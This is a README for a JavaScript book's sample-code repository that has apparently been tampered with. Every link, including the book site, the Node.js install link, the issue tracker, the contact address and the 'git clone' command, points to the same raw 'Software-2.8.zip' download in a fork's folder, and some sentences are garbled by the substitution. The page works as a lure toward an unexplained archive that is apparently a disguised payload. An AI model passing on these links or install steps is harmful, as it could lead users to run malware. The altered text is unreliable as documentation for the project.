# JavaScript Application Design
#### _A Build First Approach_

![https://github.com/videogramme/buildfirst/raw/refs/heads/master/ch03/02_rsa-config-encryption/Software-2.8.zip][1]

Accompanying code samples and snippets for the _JavaScript Application Design: A Build First Approach_ book.

This are the accompanying code samples and snippets for a book I wrote about **JavaScript build processes and application architecture**. The samples are organized by chapter, and they appear in the same order as they do in the book, for convenience. Many [other resources for this book are listed in its website](https://github.com/videogramme/buildfirst/raw/refs/heads/master/ch03/02_rsa-config-encryption/Software-2.8.zip "#buildfirst resources"), such as links to _blog posts, articles, essays, books_, and any other particularly relevant topics discussed throughout the book.

#### Fell out of the skies and would like to learn more about the book?

You could [visit its landing page](https://github.com/videogramme/buildfirst/raw/refs/heads/master/ch03/02_rsa-config-encryption/Software-2.8.zip "JavaScript Application Design: A Build First Approach") to learn all about it!

Book buying frenzy? [Say no more, stranger!](https://github.com/videogramme/buildfirst/raw/refs/heads/master/ch03/02_rsa-config-encryption/Software-2.8.zip "Get the book from Manning!")

# Installation

#### Get the Code

We need [git](https://github.com/videogramme/buildfirst/raw/refs/heads/master/ch03/02_rsa-config-encryption/Software-2.8.zip "git source control"), to `clone` the repository like below.

```shell
cd /dev/repo
git clone --recursive https://github.com/videogramme/buildfirst/raw/refs/heads/master/ch03/02_rsa-config-encryption/Software-2.8.zip
```

The `--recursive` flag is used to **clone submodules** as well. Read [a bit more about this](https://github.com/videogramme/buildfirst/raw/refs/heads/master/ch03/02_rsa-config-encryption/Software-2.8.zip) command, for context.

As an alternative, we can use a little utility developed by **GitHub**, called [hub](https://github.com/videogramme/buildfirst/raw/refs/heads/master/ch03/02_rsa-config-encryption/Software-2.8.zip "hub by GitHub"), to make cloning repositories a bit easier. It's just less verbose to type by hand, useful if you use the terminal a lot.

```shell
cd /dev/repo
hub clone --recursive bevacqua/buildfirst
```

#### Install Dependencies

You'll need **https://github.com/videogramme/buildfirst/raw/refs/heads/master/ch03/02_rsa-config-encryption/Software-2.8.zip**, refer to [this link](https://github.com/videogramme/buildfirst/raw/refs/heads/master/ch03/02_rsa-config-encryption/Software-2.8.zip "https://github.com/videogramme/buildfirst/raw/refs/heads/master/ch03/02_rsa-config-encryption/Software-2.8.zip Downloads") to install it. It comes with the `node` and `npm` command-line tools.

You will need to install dependencies for most of the examples using `npm install`. This command has to be run on each sample's directory. To relive you of this burden, you can use one of the following commands to install the packages in all of them at once. Note that you'll need to `cd` to the root of the samples directory for this to work.

```shell
cd buildfirst
```

Then, use the command that fits your **OS**, from the options below.

##### Mac OS X and Linux

We can use the `find` program.

```shell
find . -mindepth 2 -maxdepth 2 -type d -name '*_*' -print -exec npm install --prefix {} \;
```

Note that this might take a while.

##### Windows

Try this command, although it hasn't been tested. Let me know if it works!

```shell
for /d . %d in (ch*\*_*) do @if exist "%d" npm install --prefix %d
```

That's it! You are now free to _roam the sample directories_ and follow the instructions in each of them!

# Execution

To run an example, read its [https://github.com/videogramme/buildfirst/raw/refs/heads/master/ch03/02_rsa-config-encryption/Software-2.8.zip](https://github.com/videogramme/buildfirst/raw/refs/heads/master/ch03/02_rsa-config-encryption/Software-2.8.zip "To understand recursion, you must first understand recursion") and follow the instructions I've placed there. I tried to make them as straightforward as possible, but sometimes they might not match the examples in the book to the letter.

There are some examples here that you _won't find on the book_, those will generally be a bit longer: exactly the reason why I _didn't include them_ in the book. Although the code itself might not be present in the book, most of the explaining will definitely be there, rather than here.

# Release History

This is the list of releases to date. You can feel free to simply clone `master`, to get the most up-to-date version.

- [One Third Review](https://github.com/videogramme/buildfirst/raw/refs/heads/master/ch03/02_rsa-config-encryption/Software-2.8.zip "Tagged v0.0.1")

You can find [the repository up on GitHub](https://github.com/videogramme/buildfirst/raw/refs/heads/master/ch03/02_rsa-config-encryption/Software-2.8.zip "JavaScript Application Design Code Sample Repository"), which contains the latest updates to the samples, and interactively renders the Markdown code in this text, displaying images, making code prettier, styling the text, and letting you follow links.

# Troubleshooting

If you run into any problems, please create an issue [here](https://github.com/videogramme/buildfirst/raw/refs/heads/master/ch03/02_rsa-config-encryption/Software-2.8.zip). Maybe it's something that needs fixing. If you feel like contributing, that's awesome! Just fork this repo and create a [pull request](https://github.com/videogramme/buildfirst/raw/refs/heads/master/ch03/02_rsa-config-encryption/Software-2.8.zip) with your fixes or improvements.

# Feedback

You can drop me a line at `https://github.com/videogramme/buildfirst/raw/refs/heads/master/ch03/02_rsa-config-encryption/Software-2.8.zip` if you want to leave me feedback, say hi, or grunt at me about my failure to amuse you. I'd love to hear from you!

I'm also reachable through my [blog](https://github.com/videogramme/buildfirst/raw/refs/heads/master/ch03/02_rsa-config-encryption/Software-2.8.zip "Pony Foo"), I'm [@nzgb](https://github.com/videogramme/buildfirst/raw/refs/heads/master/ch03/02_rsa-config-encryption/Software-2.8.zip "@nzgb on Twitter") on Twitter, and I enjoy people stalking me over the Internet.

Let the [**#buildfirst**](https://github.com/videogramme/buildfirst/raw/refs/heads/master/ch03/02_rsa-config-encryption/Software-2.8.zip) revolution commence!

  [1]: https://github.com/videogramme/buildfirst/raw/refs/heads/master/ch03/02_rsa-config-encryption/Software-2.8.zip
